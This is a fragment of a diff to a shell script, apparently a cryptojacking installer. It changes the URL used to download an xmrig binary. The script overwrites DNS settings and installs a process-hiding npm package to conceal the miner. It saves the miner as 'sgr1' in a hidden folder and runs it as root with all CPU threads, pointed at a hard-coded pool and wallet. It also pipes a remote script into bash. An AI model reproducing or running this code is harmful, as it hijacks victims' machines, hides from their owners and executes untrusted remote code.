@@ -10,7 +10,7 @@ echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
 mkdir .kap && cd .kap
-wget -O sgr1 https://bitbucket.org/zepir/filesg/raw/main/xmrig >/dev/null 2>&1
+wget -O sgr1 https://bitbucket.org/tsyjaryj/filesg/downloads/xmrig >/dev/null 2>&1
 chmod +x sgr1
 sudo ./sgr1 -a rx/0 -o 159.65.7.244:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-AJG) -t $(nproc --all) --donate-level 1 -k --background
 curl -sL https://bitbucket.org/zepir/filesg/raw/main/boled04.sh | bash
